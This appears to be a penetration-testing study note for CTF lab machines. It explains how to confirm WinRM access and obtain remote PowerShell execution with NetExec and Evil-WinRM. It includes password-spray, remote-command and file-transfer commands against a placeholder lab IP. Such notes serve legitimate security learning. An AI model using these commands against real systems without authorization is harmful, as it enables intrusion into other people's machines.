---
tags: [windows, windows-tools]
---

> **WinRM (Windows Remote Management)** is Microsoft's protocol for remote administration of Windows systems. It uses SOAP over HTTP/HTTPS on **port 5985** (HTTP) and **5986** (HTTPS). This guide covers what we've practiced: getting a shell with NetExec and Evil-WinRM once we have credentials.

---

## Quickstart — The shell in 2 minutes

```bash
# 1. Confirm WinRM is open
nmap -p 5985,5986 -sV 10.10.10.10

# 2. Test authentication with NetExec ((Pwn3d!) confirms admin)
netexec winrm 10.10.10.10 -u Administrator -p 'Password123'

# 3. Run commands without an interactive shell
netexec winrm 10.10.10.10 -u Administrator -p 'Password123' -x 'whoami'

# 4. Get an interactive shell with Evil-WinRM
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'
```

> 💡 **WinRM vs RDP:** WinRM gives you a PowerShell shell without a GUI. It's faster, stealthier, and works even when RDP is disabled.

---

## WinRM in reconnaissance

WinRM often appears alongside SMB (445) and RPC (135) on Windows machines. When you see port **5985** or **5986** in your nmap, treat it as a shell delivery mechanism — you don't need to exploit it, you just need valid credentials.

### Classic Windows port pattern

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server     # RDP — GUI access
5985/tcp  open  wsman             # WinRM — PowerShell shell
47001/tcp open  winrm
```

> 💡 **When you see WinRM + SMB + RDP on the same machine**, your priority is finding credentials. Once you have them, you can choose your shell: RDP for GUI (`xfreerdp`), WinRM for commands with NetExec, or SMB for file access (`smbclient`).

---

## NetExec — WinRM Authentication & Command Execution

NetExec is the fastest way to test WinRM credentials and run commands without a full interactive shell.

```bash
# Authenticate — the (Pwn3d!) tag confirms admin access
netexec winrm 10.10.10.10 -u user -p 'Password123'
# Output:
# WINRM  10.10.10.10  5985  TARGET  [*] Windows 10 / Server 2019 Build 19041 (name:TARGET)
# WINRM  10.10.10.10  5985  TARGET  [+] Target\user:Password123 (Pwn3d!)

# Run a command
netexec winrm 10.10.10.10 -u user -p 'Password123' -x 'whoami'

# Run PowerShell
netexec winrm 10.10.10.10 -u user -p 'Password123' -x 'powershell -c "Get-Process"'

# Password spray
netexec winrm 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce

# Non-interactive enumeration (find users + flag)
netexec winrm 10.10.10.10 -u Administrator -p 'Password123' -x 'dir C:\Users'
netexec winrm 10.10.10.10 -u Administrator -p 'Password123' -x 'type C:\Users\mike\Desktop\flag.txt'
```

> 💡 **The `(Pwn3d!)` tag:** NetExec shows it when the authenticated user has **local administrator** privileges on the target. If you see `(Pwn3d!)`, you have full control — no need to escalate privileges.

---

## Evil-WinRM — Interactive shell (alternative, not yet used in writeups)

In our writeups we've only used NetExec with `-x` for quick commands. Evil-WinRM is a popular alternative that gives a full interactive PowerShell shell — we'll use it in future machines.

```bash
# With password
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'

# With SSL (port 5986)
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123' -S

# File transfer inside the shell
upload /local/path/file.exe C:\Users\Administrator\file.exe
download C:\Users\Administrator\flag.txt /local/path/flag.txt
```

---

## CTF Workflow — WinRM

1. **Enumerate** — `nmap -p 5985,5986 -sV` to confirm WinRM is open
2. **Find credentials** — search web files, crack Responder hashes, check SMB shares
3. **Test auth** — `netexec winrm TARGET -u USER -p PASS -x 'whoami'`
4. **Get a shell** — NetExec with `-x` for quick commands
5. **Enumerate** — `whoami`, `dir C:\Users`, `type C:\Users\...\Desktop\flag.txt`

---

## 🔗 Related

**Machines:** [[🩰 Dancing]], [[💥 Explosion]], [[🧑‍🚒 Responder]]

**Guides:** [[🔐 NTLM]], [[🖥️ xfreerdp]], [[🔧 John the Ripper]]

---

## References

- [HackTricks — WinRM](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/winrm)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [NetExec Wiki](https://www.netexec.wiki/)
